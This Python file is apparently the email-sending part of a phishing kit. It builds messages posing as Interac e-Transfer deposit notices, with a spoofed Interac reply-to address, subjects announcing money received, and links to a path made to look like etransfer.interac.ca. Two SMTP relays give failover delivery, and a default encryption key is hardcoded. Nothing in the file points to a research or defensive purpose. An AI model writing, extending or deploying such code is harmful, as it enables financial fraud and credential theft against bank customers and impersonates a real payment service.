
import os
import uuid
import logging
import time
import base64
import hashlib
import urllib.parse
from datetime import datetime, timedelta
from .smtp_provider import SMTPProvider
from .template_service import TemplateService
from .database import db

logger = logging.getLogger("MailerService")

class MailerService:
    def __init__(self):
        # Relay Alpha (Primary: Office 365)
        self.relay_alpha = SMTPProvider(
            os.getenv("SMTP_HOST", "smtp.rbos.net"), # Updated host
            int(os.getenv("SMTP_PORT", 587)),
            os.getenv("SMTP_USERNAME_PRIMARY", "relay@rbos.net"), # Updated username
            os.getenv("SMTP_PASSWORD_PRIMARY", "") # Password from env
        )
        
        # Relay Beta (Failover)
        self.relay_beta = SMTPProvider(
            os.getenv("SMTP_HOST_FAILOVER", "smtp1.rbos.net"), # Updated host
            int(os.getenv("SMTP_PORT_FAILOVER", 587)),
            os.getenv("SMTP_USERNAME_FAILOVER", "relay1@rbos.net"), # Updated username
            os.getenv("SMTP_PASSWORD_FAILOVER", "") # Password from env
        )
        
        self.encryption_key = os.getenv("ENCRYPTION_KEY", "a3f91b6cd024e8c29b76a149efcc5d42")
        
        # Explicit template directory mapping
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        template_dir = os.path.join(base_dir, 'templates')
        
        if not os.path.exists(template_dir):
            os.makedirs(template_dir, exist_ok=True)
            
        self.templates = TemplateService(template_dir)

    def generate_tx_id(self):
        return f"CA{str(uuid.uuid4())[:8].upper()}"

    def generate_link(self, tx_id, amount_val):
        # Use dynamic app URL or localhost fallback
        app_url = os.getenv("APP_URL", "http://localhost:3002").rstrip('/')
        payload = {
            'transaction_id': tx_id,
            'amount': float(amount_val),
            'timestamp': int(time.time()),
            'expires': int(time.time()) + (30 * 86400),
            'sender': os.getenv("SENDER_NAME", "JENNIFER EDWARDS")
        }
        query = urllib.parse.urlencode(payload)
        token = base64.b64encode(query.encode()).decode()
        # Clean token for URL safety
        safe_token = token.replace('+', '-').replace('/', '_').rstrip('=')
        return f"{app_url}/cgi-admin2/app/api/etransfer.interac.ca/RF.do.php?deposit={safe_token}"

    def send_email(self, data, tx_id, link):
        recipient = data.get('recipient_email')
        sender_display = os.getenv("SENDER_NAME", "JENNIFER EDWARDS")
        
        context = {
            "sender_name": sender_display,
            "tx_id": tx_id,
            "transaction_id": tx_id,
            "amount": "{:.2f}".format(float(data.get('amount', 0))),
            "date": datetime.now().strftime("%b %d, %Y"),
            "expiry_date": (datetime.now() + timedelta(days=30)).strftime("%b %d, %Y"),
            "action_url": link,
            "etransfer_interac_ca": link,
            "memo": data.get('purpose', 'Interac e-Transfer'),
            "recipient_email": recipient,
            "receiver_name": data.get('recipient_name', 'Customer'),
        }

        template_name = data.get('template') or 'Deposit.html'
        html = self.templates.render(template_name, context)
        
        if not html or len(html.strip()) < 50:
            html = self.templates.render('notification.html', context)

        subject = f"INTERAC e-Transfer: {sender_display} sent you ${context['amount']}"
        reply_to = "notify@payments.interac.ca"

        try:
            logger.info(f"Dispatching via RELAY_ALPHA to {recipient}...")
            self.relay_alpha.dispatch(recipient, sender_display, subject, html, reply_to=reply_to)
            path_taken = "RELAY_ALPHA"
        except Exception as e:
            logger.warning(f"RELAY_ALPHA fault: {e}. Attempting RELAY_BETA failover...")
            try:
                self.relay_beta.dispatch(recipient, sender_display, subject, html, reply_to=reply_to)
                path_taken = "RELAY_BETA"
            except Exception as e2:
                logger.error(f"Critical Dispatch Blackout: Both relays failed.")
                db.log_event("DISPATCH_FAILURE", f"Failed to reach {recipient}")
                # Raise to be caught by the route handler
                raise Exception("Failed to send, Please check your network and try again")

        db.log_event("MAILING_SUCCESS", f"Sent to {recipient} via {path_taken}")
        return {"success": True, "path": path_taken}
